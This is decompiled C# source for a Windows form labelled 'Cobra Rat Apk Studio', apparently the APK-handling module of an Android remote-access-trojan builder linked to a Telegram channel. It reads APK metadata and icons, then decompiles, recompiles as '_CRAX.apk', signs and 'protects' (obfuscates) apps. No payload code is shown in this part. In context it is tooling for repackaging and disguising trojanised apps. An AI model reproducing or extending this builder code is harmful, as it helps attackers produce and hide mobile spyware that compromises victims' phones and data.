		this.savebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.savebtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.savebtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(15, 15, 15);
		this.savebtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.savebtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.savebtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.savebtn.Location = new System.Drawing.Point(16, 15);
		this.savebtn.Name = "savebtn";
		this.savebtn.Size = new System.Drawing.Size(126, 134);
		this.savebtn.TabIndex = 46;
		this.savebtn.Text = "Save icon";
		this.savebtn.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.savebtn.UseVisualStyleBackColor = true;
		this.apkicon.Location = new System.Drawing.Point(11, 191);
		this.apkicon.Name = "apkicon";
		this.apkicon.Size = new System.Drawing.Size(126, 104);
		this.apkicon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.apkicon.TabIndex = 0;
		this.apkicon.TabStop = false;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label1.Font = new System.Drawing.Font("Calibri", 7.8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.Location = new System.Drawing.Point(0, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(762, 20);
		this.Label1.TabIndex = 46;
		this.Label1.Text = "Cobra Rat Apk Studio";
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(762, 629);
		base.Controls.Add(this.workpanel);
		base.Controls.Add(this.toppanel);
		base.Controls.Add(this.Label1);
		this.ForeColor = System.Drawing.Color.SkyBlue;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "Apk_studio";
		this.Text = "Cobra Rat Apk Studio By t.me/CobraRat";
		this.toppanel.ResumeLayout(false);
		this.workpanel.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		this.titlespanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.apkicon).EndInit();
		base.ResumeLayout(false);
	}

	public Apk_studio()
	{
		base.Load += Apk_studio_Load;
		TargetAPKPATH = "";
		TargetAPKNAME = "";
		TargetWorkPATH = "";
		craxsStudioPath = "";
		APKINFO = "";
		Apkeditorpath = "";
		InitializeComponent();
	}

	public void log(string str)
	{
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			logtext.AppendText("> " + str + "\r\n-----------------------\r\n");
		}));
	}

	private void Selectapkbtn_Click(object sender, EventArgs e)
	{
		if (BackgroundWorker1.IsBusy)
		{
			CraxsAlert.Showinformation("Please Wait.");
		}
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
		openFileDialog.Filter = "apk Files|*.apk";
		openFileDialog.RestoreDirectory = true;
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			TargetApktext.Text = "";
			return;
		}
		TargetApktext.Text = openFileDialog.FileName;
		TargetAPKPATH = openFileDialog.FileName;
		string directoryName = Path.GetDirectoryName(TargetAPKPATH);
		TargetAPKNAME = Path.GetFileNameWithoutExtension(TargetAPKPATH);
		craxsStudioPath = directoryName + "\\Craxs_Studio";
		if (!Directory.Exists(craxsStudioPath))
		{
			Directory.CreateDirectory(craxsStudioPath);
		}
		titlespanel.Enabled = true;
		titlespanel.Visible = true;
		if (!BackgroundWorker1.IsBusy)
		{
			BackgroundWorker1.RunWorkerAsync();
		}
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			return;
		}
		_Closure_0024__116_002D0 arg = default(_Closure_0024__116_002D0);
		_Closure_0024__116_002D0 CS_0024_003C_003E8__locals48 = new _Closure_0024__116_002D0(arg);
		CS_0024_003C_003E8__locals48._0024VB_0024Me = this;
		APKINFO = Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\aapt.exe"), "dump badging \"" + TargetAPKPATH + "\"");
		if (apkicon.Image != null)
		{
			apkicon.Image.Dispose();
			apkicon.Image = null;
		}
		CS_0024_003C_003E8__locals48._0024VB_0024Local_appname = Codes.ExtractName(TargetAPKPATH);
		CS_0024_003C_003E8__locals48._0024VB_0024Local_PackageName = Conversions.ToString(Codes.RegexMatcher("(?<=package: name=\\')(.*?)(?=\\')", APKINFO));
		CS_0024_003C_003E8__locals48._0024VB_0024Local_Vercode = Conversions.ToString(Codes.RegexMatcher("(?<=versionCode=\\')(.*?)(?=\\')", APKINFO));
		CS_0024_003C_003E8__locals48._0024VB_0024Local_Vername = Conversions.ToString(Codes.RegexMatcher("(?<=versionName=\\')(.*?)(?=\\')", APKINFO));
		string sdkNumber = Conversions.ToString(Codes.RegexMatcher("(?<=sdkVersion:\\')(.*?)(?=\\')", APKINFO));
		CS_0024_003C_003E8__locals48._0024VB_0024Local_androidfrom = Codes.GetAndroidVersionName(sdkNumber);
		string sdkNumber2 = Conversions.ToString(Codes.RegexMatcher("(?<=targetSdkVersion:\\')(.*?)(?=\\')", APKINFO));
		CS_0024_003C_003E8__locals48._0024VB_0024Local_androidto = Codes.GetAndroidVersionName(sdkNumber2);
		if (string.IsNullOrEmpty(CS_0024_003C_003E8__locals48._0024VB_0024Local_appname))
		{
			MatchCollection matchCollection = Regex.Matches(APKINFO, "application-label:'([^']*)'");
			if (matchCollection.Count > 0)
			{
				foreach (Match item in matchCollection)
				{
					string value = item.Groups[1].Value;
					Console.WriteLine("Found application label: " + value);
					CS_0024_003C_003E8__locals48._0024VB_0024Local_appname = value;
				}
			}
			else
			{
				CS_0024_003C_003E8__locals48._0024VB_0024Local_appname = "Not found";
			}
		}
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals48._0024VB_0024Me.nametext.Text = "App Name: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_appname;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.pkgtext.Text = "Package Name: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_PackageName;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.vercodtext.Text = "Version Code: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_Vercode;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.vernamtext.Text = "Version Name: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_Vername;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.andfromtext.Text = "Support from: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_androidfrom;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.andtotext.Text = "Support up to: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_androidto;
				}));
			}
			else
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals48._0024VB_0024Me.nametext.Text = "姓名: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_appname;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.pkgtext.Text = "标识符: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_PackageName;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.vercodtext.Text = "版本代码: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_Vercode;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.vernamtext.Text = "版本名称: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_Vername;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.andfromtext.Text = "来自的支持: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_androidfrom;
					CS_0024_003C_003E8__locals48._0024VB_0024Me.andtotext.Text = "支持高达: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_androidto;
				}));
			}
		}
		else
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals48._0024VB_0024Me.nametext.Text = "الأسم: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_appname;
				CS_0024_003C_003E8__locals48._0024VB_0024Me.pkgtext.Text = "المعرف: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_PackageName;
				CS_0024_003C_003E8__locals48._0024VB_0024Me.vercodtext.Text = "رقم الاصدار: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_Vercode;
				CS_0024_003C_003E8__locals48._0024VB_0024Me.vernamtext.Text = "اسم الاصدار: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_Vername;
				CS_0024_003C_003E8__locals48._0024VB_0024Me.andfromtext.Text = "يدعم من: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_androidfrom;
				CS_0024_003C_003E8__locals48._0024VB_0024Me.andtotext.Text = "يدعم حتى: " + CS_0024_003C_003E8__locals48._0024VB_0024Local_androidto;
			}));
		}
		string text = Conversions.ToString(Codes.RegexMatcher("(?<=application-icon-160:\\')(.*?)(?=\\')", APKINFO));
		if (Operators.CompareString(Path.GetExtension(text), ".xml", TextCompare: false) == 0)
		{
			text = text.Replace(".xml", ".png");
		}
		string text2 = Codes.TempPathCache + CS_0024_003C_003E8__locals48._0024VB_0024Local_PackageName + "\\\\" + text;
		string directoryName = Path.GetDirectoryName(text2);
		if (text.Contains("anydpi-v26"))
		{
			string[] pngs = Codes.pngs;
			foreach (string newValue in pngs)
			{
				string text3 = text.Replace("mipmap-anydpi-v26", newValue).Replace("drawable-anydpi-v26", newValue);
				Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + TargetAPKPATH + "\" \"" + text3 + "\" -o\"" + directoryName + "\" -aoa");
			}
		}
		else
		{
			Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + TargetAPKPATH + "\" \"" + text + "\" -o\"" + directoryName + "\" -aoa");
		}
		Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), "e \"" + TargetAPKPATH + "\" \"META-INF\" -o\"" + Codes.TempPathCache + CS_0024_003C_003E8__locals48._0024VB_0024Local_PackageName + "\\META-INF\" -aoa");
		try
		{
			apkicon.Image = Image.FromFile(text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			apkicon.Image = Resources.noicon;
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (apkicon.Image != null)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = "image.png";
			saveFileDialog.Filter = "PNG Image|*.png";
			saveFileDialog.RestoreDirectory = true;
			DialogResult dialogResult = saveFileDialog.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				string fileName = saveFileDialog.FileName;
				Image image = apkicon.Image;
				Bitmap bitmap = new Bitmap(image.Width, image.Height, PixelFormat.Format32bppArgb);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.DrawImage(image, new Rectangle(0, 0, image.Width, image.Height));
				}
				bitmap.Save(fileName, ImageFormat.Png);
				CraxsAlert.ShowSucess("Image saved successfully.");
			}
		}
		else
		{
			CraxsAlert.Showinformation("No image to save.");
		}
	}

	private void Andtotext_Click(object sender, EventArgs e)
	{
		Label label = (Label)sender;
		Clipboard.SetText(label.Text);
		CraxsAlert.ShowSucess("copied to clipboard: " + label.Text);
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			CraxsAlert.Showinformation("Select Apk First.");
		}
		else if (!Directory.Exists(TargetWorkPATH) || Codes.MyMsgBox("Confirm", "this app is decompiled before \r\nDecompile again ?", useno: true, Resources.information48px))
		{
			if (deworker.IsBusy)
			{
				CraxsAlert.Showinformation("Decompiling  , Please Wait...");
				return;
			}
			log("Starting Decompile..");
			deworker.RunWorkerAsync();
		}
	}

	private void Deworker_DoWork(object sender, DoWorkEventArgs e)
	{
		string directoryName = Path.GetDirectoryName(TargetAPKPATH);
		TargetWorkPATH = directoryName + "\\Craxs_Studio\\" + TargetAPKNAME;
		string text = Codes.ExecuteDecompile(TargetAPKPATH, TargetWorkPATH);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			if (text.Contains("Copying original files"))
			{
				CraxsAlert.ShowSucess("Decompiling finish");
				log("Decompiling finish");
				workdirtext.Text = TargetWorkPATH;
			}
			else
			{
				CraxsAlert.ShowError("Decompiling failed");
				log("Decompiling failed");
			}
			log(text.Replace("\r\n", "\r\n"));
		}));
	}

	private void Button5_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			CraxsAlert.Showinformation("Select Apk First.");
		}
		else if (protectworker.IsBusy)
		{
			CraxsAlert.Showinformation("Protector is busy , Please Wait...");
		}
		else
		{
			protectworker.RunWorkerAsync();
		}
	}

	private void Protectworker_DoWork(object sender, DoWorkEventArgs e)
	{
		string str = Codes.Excuteapkeditor_pro(TargetAPKPATH);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			if (File.Exists(TargetAPKPATH.Replace(".apk", "_protected.apk")))
			{
				log("APK Protected finish");
				CraxsAlert.ShowSucess("APK Protected finish");
			}
			else
			{
				log("APK Protected failed");
				CraxsAlert.ShowSucess("APK Protected failed");
			}
			log(str);
		}));
	}

	private void Button4_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			CraxsAlert.Showinformation("Select Apk First.");
		}
		else if (string.IsNullOrEmpty(TargetWorkPATH))
		{
			CraxsAlert.Showinformation("Decompile Apk First.");
		}
		else if (COworker.IsBusy)
		{
			CraxsAlert.Showinformation("Compiling  , Please Wait...");
		}
		else
		{
			COworker.RunWorkerAsync();
		}
	}

	private void COworker_DoWork(object sender, DoWorkEventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = TargetAPKNAME + "_CRAX.apk";
		saveFileDialog.Filter = "APK file|*.apk";
		saveFileDialog.RestoreDirectory = true;
		DialogResult dialogResult = default(DialogResult);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			dialogResult = saveFileDialog.ShowDialog();
		}));
		if (dialogResult != DialogResult.OK)
		{
			return;
		}
		string fileName = saveFileDialog.FileName;
		string text = Codes.ExecuteCompile(TargetWorkPATH, fileName);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			if (text.Contains("Built apk"))
			{
				CraxsAlert.ShowSucess("Compiling finish");
				log("Compiling finish");
			}
			log(text.Replace("\r\n", "\r\n"));
		}));
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(TargetAPKPATH))
		{
			CraxsAlert.Showinformation("Select Apk First.");
			return;
		}
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = TargetAPKNAME + "_Signed.apk";
		saveFileDialog.Filter = "APK file|*.apk";
		saveFileDialog.RestoreDirectory = true;
		DialogResult dialogResult = default(DialogResult);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			dialogResult = saveFileDialog.ShowDialog();
		}));
		if (dialogResult != DialogResult.OK)
		{
			return;
		}
		string fileName = saveFileDialog.FileName;
		Codes.ExecuteSign(TargetAPKPATH, fileName);
		Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
		{
			log("Sing finish");
			if (File.Exists(fileName))
			{
				CraxsAlert.ShowSucess("Sing finish");
				log("Sing finish");
			}
			else
			{
				CraxsAlert.ShowError("Sing failed");
				log("Sing failed");
			}
		}));
	}

	private void TargetApktext_TextChanged(object sender, EventArgs e)
	{
	}

	private void Apk_studio_Load(object sender, EventArgs e)
	{
		Translateme();
	}

	private void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				savebtn.Text = "保存图片";
				debtn.Text = "反编译";
				cobtn.Text = "编译";
				sinbtn.Text = "签名";
				probtn.Text = "保护";
				selectapkbtn.Text = "选择一个文件";
				Label2.Text = "工作路径";
			}
		}
		else
		{
			savebtn.Text = "احفظ الصورة";
			debtn.Text = "فك التطبيق";
			cobtn.Text = "تجميع";
			sinbtn.Text = "إمضاء";
			probtn.Text = "حماية";
			selectapkbtn.Text = "إختيار تطبيق";
			Label2.Text = "مسار العمل";
		}
	}
}
